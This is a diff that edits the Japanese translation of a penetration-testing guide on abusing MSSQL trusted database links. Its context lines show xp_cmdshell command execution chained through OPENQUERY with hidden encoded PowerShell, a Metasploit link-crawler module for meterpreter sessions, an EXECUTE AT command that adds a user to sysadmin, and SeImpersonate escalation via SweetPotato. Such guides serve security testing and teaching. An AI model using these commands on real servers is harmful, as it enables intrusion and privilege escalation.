@@ -166,7 +166,7 @@ MSSQLホスト内で**コマンドを実行**することも可能かもしれ�
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-チェックインのページには、**次のセクションで手動でこれを行う方法が記載されています。**
+チェックインのページで、**次のセクションに手動で行う方法を確認してください。**
 
 ### MSSQL基本ハッキングテクニック
 
@@ -176,7 +176,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL信頼されたリンク
 
-MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行することができます**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤って構成されたデータベースを見つけることができるかもしれません。
+MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行できるようになります**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤って設定されたデータベースを見つけることができるかもしれません。
 
 **データベース間のリンクは、フォレストトラストを越えても機能します。**
 
@@ -226,13 +226,13 @@ metasploitを使用して、信頼できるリンクを簡単に確認できま�
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-メタスプリットはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）
+注意してください、metasploitはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）
 
 ### 手動 - Openquery()
 
 **Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。
 
-**Windows**からも、リンクを見つけて手動でコマンドを実行することができる**MSSQLクライアントのような** [**HeidiSQL**](https://www.heidisql.com)を使用できます。
+**Windows**からも、リンクを見つけて手動でコマンドを実行することができる**MSSQLクライアントのような**[**HeidiSQL**](https://www.heidisql.com)を使用できます。
 
 _Windows認証を使用してログイン：_
 
@@ -247,7 +247,7 @@ EXEC sp_linkedservers;
 
 #### 信頼できるリンクでクエリを実行する
 
-リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）。
+リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -256,7 +256,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-これらの信頼されたリンクのチェーンを手動で永遠に続けることができます。
+手動でこれらの信頼されたリンクのチェーンを永遠に続けることができます。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -264,7 +264,7 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-`exec xp_cmdshell`を`openquery()`から実行できない場合は、`EXECUTE`メソッドを試してください。
+`openquery()`から`exec xp_cmdshell`のようなアクションを実行できない場合は、`EXECUTE`メソッドを試してください。
 
 ### 手動 - EXECUTE
 
@@ -278,9 +278,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な種類の特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそのサービスを偽装することができます。
+多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、認証を試みている間にSYSTEMサービスを偽装することができます。
 
-[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションがあります。
+[SweetPotato](https://github.com/CCob/SweetPotato)は、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションを持っています。
 
 
 
